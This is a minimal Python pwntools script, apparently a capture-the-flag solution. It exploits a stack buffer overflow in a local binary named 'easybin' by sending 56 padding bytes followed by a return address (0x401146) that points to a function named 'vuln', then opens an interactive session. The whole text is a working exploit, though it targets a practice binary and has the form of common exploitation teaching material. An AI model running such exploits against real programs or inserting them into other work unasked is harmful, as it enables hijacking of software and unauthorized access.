from pwn import*

p = process('./easybin')

vuln = 0x0000000000401146
payload = b'a'*56 + p64(vuln)

p.sendline(payload)
p.interactive()
